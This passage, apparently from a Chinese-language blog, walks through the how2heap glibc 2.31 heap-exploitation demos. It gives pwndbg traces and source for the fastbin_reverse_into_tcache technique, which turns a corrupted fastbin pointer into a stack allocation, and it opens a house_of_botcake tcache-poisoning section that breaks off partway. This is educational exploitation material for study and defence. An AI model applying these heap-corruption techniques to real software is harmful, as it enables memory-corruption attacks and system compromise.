class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个的 fd被我们写成了 stack 的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559560</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559568</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559570</span> —▸ <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559578</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559518</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559520</span> —▸ <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559528</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555594c8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时我们 malloc 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> ◂— <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) ◂— mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> ► <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe218</span> —▸ <span class="number">0x555555559010</span> ◂— <span class="number">0x7000000000000</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559660</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，原本在fastbin 的chunk list 都被放到了 tcaceh bins 里</p><p>如果我们最后再malloc 一次，我们就能拿到栈的地址  （tcache  不检查size域）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> ► <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe1f8</span> —▸ <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rax r8  <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x0</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;ДUUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样我们可以达到一个任意地址写 或者读的原语（取决于下一步对 这分配出来的chunk进行什么样的操作）</p><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>构造如下情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>此时的 tcache 是被填满的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后我们free a 再 free prev ， 由于 prev 与  a 是相邻 chunk ，所以会触发合并，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 